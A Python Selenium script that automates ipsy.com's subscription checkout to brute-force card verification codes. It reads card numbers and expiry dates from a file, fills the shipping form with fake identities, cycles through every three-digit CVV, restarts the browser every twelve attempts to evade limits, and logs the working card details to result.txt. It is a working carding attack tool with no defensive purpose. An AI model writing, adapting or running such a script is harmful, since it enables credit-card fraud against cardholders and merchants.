from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait as Wait
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.chrome.options import Options
from faker import Faker
from setDriver import get_chromedriver
from function import getFirs15StepDone
from function import PaymentForm
option = webdriver.ChromeOptions()
#option.add_argument('proxy-server=106.122.8.54:3128')
EXE_PATH = r'C:\chromedriver.exe'
f = Faker()
flag = True
ccv_number=["%03d" % i for i in range(999)]
loop_number=0
attempt_number=1
credit_card_file = open('credit_card.txt')
credit_card_list = credit_card_file.readlines()
for credit_card in credit_card_list:
    credit_card_split =credit_card.split('|')
    loop_number = 0
    while True:
        attempt_number = 0
        new_cart=False
        #driver = webdriver.Chrome(executable_path=EXE_PATH, options=option)
        driver = get_chromedriver(True,None,loop_number)
        driver.get('https://www.ipsy.com/quiz/take/questions/')
       # driver.get('https://httpbin.org/ip')
        wait = WebDriverWait(driver, 20)
        getFirs15StepDone(driver,wait)
        while True:
            try:
                EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Next')]"))
                element = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Next')]")))
                if (element != 0):
                    element.click()
                    break
            except TimeoutException as ex:
                print "It is all good, no element there"
        while True:
            try:
                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, 'shipping-firstname')))
                break
            except TimeoutException as ex:
                print "It is all good, shipping-firstname sitll load"
        driver.find_element_by_id('shipping-firstname').send_keys(f.first_name())
        driver.find_element_by_id('shipping-lastname').send_keys(f.first_name())
        driver.find_element_by_name('shippingAddressAddress1').send_keys(f.address())
        # driver.find_element_by_name('shippingAddressAddress2').send_keys('')
        driver.find_element_by_name('shippingAddressCity').send_keys('New York')
        driver.find_element_by_xpath("//select[@name='shippingAddressState']/option[text()='New York']").click()
        driver.find_element_by_name('shippingAddressZip').send_keys('10001')

        # set card Number
        # card-number

        driver.find_element_by_id('card-number').send_keys(credit_card_split[0])
        driver.find_element_by_xpath("//select[@name='creditCardExpiryMonth']/option[text()='"+credit_card_split[1]+"']").click()
        driver.find_element_by_xpath("//select[@name='creditCardExpiryYear']/option[text()='"+credit_card_split[2]+"']").click()

        while True:
            attempt_number = attempt_number + 1
            if (attempt_number == 13):
                driver.quit()
                break

            try:
                try:
                    driver.find_element_by_name('creditCardVerificationNumber').clear()
                    driver.find_element_by_name('creditCardVerificationNumber').send_keys(ccv_number[loop_number])
                    driver.find_element_by_id('subscribe-btn-placeholder').click()

                    element = WebDriverWait(driver, 5).until(
                        EC.visibility_of_element_located((By.CSS_SELECTOR, '.error-container')))
                    print ('Current CCv Number :', ccv_number[loop_number])

                except NoSuchElementException as ex:
                    result = open('result.txt','a+')
                    result.write(credit_card_split[0]+'|'+credit_card_split[1]+'|'+credit_card_split[2]+'|'+ccv_number[loop_number])
                    result.close()
                    new_cart=True
                    print('will be out the loop')
                    break

            except TimeoutException as ex:
                print "Time out for all"
                print(attempt_number)

            loop_number = loop_number + 1
            if new_cart:
                print 'New Cart Will Add Here -_-'
                break
            print ('Current Loop Number :', loop_number)



